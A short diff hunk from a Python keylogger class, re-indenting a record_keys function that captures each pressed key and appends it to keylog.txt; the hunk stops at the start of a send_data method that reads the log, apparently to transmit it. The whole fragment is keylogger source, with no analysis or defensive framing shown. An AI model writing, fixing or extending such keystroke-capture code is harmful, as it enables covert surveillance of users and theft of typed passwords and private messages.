@@ -38,18 +38,18 @@ class Keylogger:
         input("Press Enter to stop...")
 
     def record_keys(event):
-    if event.event_type == "down":
-        if event.name == "space":
-            key = " "
-        elif event.name == "enter":
-            key = "\n"
-        elif event.name == "backspace":
-            key = " <-- "
-        else:
-            key = event.name
+        if event.event_type == "down":
+            if event.name == "space":
+                key = " "
+            elif event.name == "enter":
+                key = "\n"
+            elif event.name == "backspace":
+                key = " <-- "
+            else:
+                key = event.name
         
-        with open("keylog.txt", "a") as file:
-            file.write(key)
+            with open("keylog.txt", "a") as file:
+                file.write(key)
 
     def send_data(self):
         with open(self.log_file, "r") as file:
